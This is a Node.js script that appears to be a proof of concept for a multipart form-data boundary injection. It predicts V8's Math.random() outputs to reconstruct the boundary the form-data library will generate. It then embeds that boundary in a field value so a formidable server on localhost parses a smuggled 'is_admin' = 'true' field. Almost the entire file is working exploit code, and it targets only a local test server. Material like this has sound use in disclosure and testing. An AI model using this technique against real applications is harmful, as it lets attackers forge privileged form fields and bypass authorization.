const http = require("http");
const IncomingForm = require("formidable").IncomingForm;
const predictV8Randomness = require("predict-v8-randomness");
const path = require("path");
const FormData = require("form-data");

const port = 5000;
const rootDir = __dirname;

const initialSequence = [
  Math.random(),
  Math.random(),
  Math.random(),
  Math.random(),
];
const predictor = new predictV8Randomness.Predictor(initialSequence);
predictor.predictNext(24).then(function (next24RandomOutputs) {
  const predictedBoundary = next24RandomOutputs
    .map(function (v) {
      return Math.floor(v * 10).toString(16);
    })
    .join("");

  const boundaryIntro = "----------------------------";

  const payload =
    "zzz" +
    "\r\n" +
    boundaryIntro +
    predictedBoundary +
    '\r\nContent-Disposition: form-data; name="is_admin"\r\n\r\ntrue\r\n' +
    boundaryIntro +
    predictedBoundary +
    "--\r\n";

  const FIELDS = {
    my_field: {
      value: payload,
    },
    is_admin: {
      value: "false",
    },
  };

  server.listen(port, () => {
    const form = new FormData();

    Object.entries(FIELDS).forEach(([name, field]) => {
      form.append(
        name,
        typeof field.value === "function" ? field.value() : field.value
      );
    });

    form.submit(`http://localhost:${port}/`, (err, res) => {
      if (err) {
        throw err;
      }

      // unstuck new streams
      res.resume();

      server.close();
    });
  });
});

const server = http.createServer((req, res) => {
  const incomingForm = new IncomingForm({
    uploadDir: path.join(rootDir, "/tmp"),
  });
  incomingForm.parse(req);

  incomingForm
    .on("field", function (name, value) {
      console.log(`Field: ${name} = ${value}`);
    })
    .on("file", function (name, file) {
      console.log(`File: ${name} = ${file.name}`);
    })
    .on("end", function () {
      console.log("Form parsing completed.");

      res.writeHead(200);
      res.end("done");
    });
});

process.on("exit", function () {
  console.log("Process exiting, closing server...");
});
